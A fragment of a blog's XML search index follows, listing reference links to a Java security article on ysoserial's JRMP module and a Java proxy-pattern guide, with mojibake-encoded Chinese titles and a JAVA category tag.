<p><a href="https://www.cnblogs.com/nice0e3/p/14333695.html">Javaå®‰å…¨ä¹‹ysoserial-JRMPæ¨¡å—åˆ†æï¼ˆä¸€ï¼‰</a></p>
<p><a href="https://javaguide.cn/java/basis/proxy.html">Java ä»£ç†æ¨¡å¼è¯¦è§£</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
</search>
